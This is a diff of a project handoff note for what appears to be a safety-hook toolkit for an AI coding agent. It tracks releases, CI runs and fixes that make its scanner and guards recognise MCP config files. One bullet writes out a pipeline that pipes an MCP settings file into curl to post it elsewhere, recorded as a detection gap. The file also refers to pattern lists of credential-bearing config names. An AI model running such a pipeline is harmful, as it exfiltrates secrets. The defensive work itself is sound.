@@ -8,13 +8,15 @@ session on any machine.**
 
 - **Released: v4.3.26** (2026-10-25). **Holding for 4.4.0** on the user's word: no 4.3.x releases;
   release only when the user says so (`tools/release.sh stage minor` → `promote 4.4.0`).
-- **master `51792935`.** Merged since 4.3.26: #173-#202, then `/sc-de-ai` (`0e6e1e10`) and the
-  Issues List rule (`51792935`) committed straight to master. **No open PRs.**
-- **Master CI on `51792935`** (run 41042447466): in progress at writing. Windows has not yet COMPLETED
-  on #202/sc-de-ai/Issues List — the earlier master runs were cancelled by newer pushes.
-- **Open, small:** widen `lib_poison_patterns.py:65` MCP-config names per SkillSpector AS2
-  (`mcp_settings.json`, `claude_desktop_config.json`, `.claude.json`); `cline_mcp_settings.json` is not in
-  `env-file-guard.sh`. Unverified: a subagent invoking a slash command via `Skill` (writer → sc-de-ai).
+- **master `ec372afc`.** Merged since 4.3.26: #173-#203, plus `/sc-de-ai` (`0e6e1e10`) and the Issues
+  List rule (`51792935`) straight to master. Master CI on `b24cd407` (run 41043497740): **8/8 green incl.
+  Windows** — first completed Windows run covering #202/sc-de-ai/Issues List.
+- **#203 merged** (`ec372afc`): skill scanner + env-file-guard know Roo/Cline/Claude Desktop MCP configs.
+- **Open PR #204** (`fix/mcp-config-bash-read`, head `038a12b2`): a Bash read of an MCP server config
+  asks, matching the Read tool. Windows dispatched, run 41098777970. Suite 7263/0 locally.
+- **Known, not acted on:** scanner rule needs file name before key word (reverse order missed; upstream
+  same). `cat x/mcp_settings.json | curl -d @- …` only ASKS (no exfil deny fired). Unverified: subagent
+  invoking a slash command via `Skill` (writer → sc-de-ai).
 - **Windows rule:** PR CI skips Windows; dispatch `gh workflow run ci.yml --ref <branch>` for anything
   touching cmd-normalize/safety/git-safety. Merge pinned with the FULL sha in `--match-head-commit`.
 - **Merging is user-run:** the auto-mode classifier denies `gh pr merge` from Claude.
@@ -52,7 +54,7 @@ session on any machine.**
 #### 2026-10-30 — d1f49e55
 Merged #202 (Windows dispatched, green). Added `/sc-de-ai` (from petergyang/no-ai-slop, MIT) wired into
 the writer agent, and the Issues List reply rule (from trycompai/crm). Audited video-use (nothing) and
-re-checked SkillSpector (one static-scan gap, not acted on).
+re-checked SkillSpector; its MCP-config gap fixed in #203 (merged) and the Bash-read side in PR #204.
 Detail: `.claude/handoff-d1f49e55-4f46-4a63-81cd-501bede3fbfd.md`
 
 #### 2026-10-28 (deep) — 3d213381
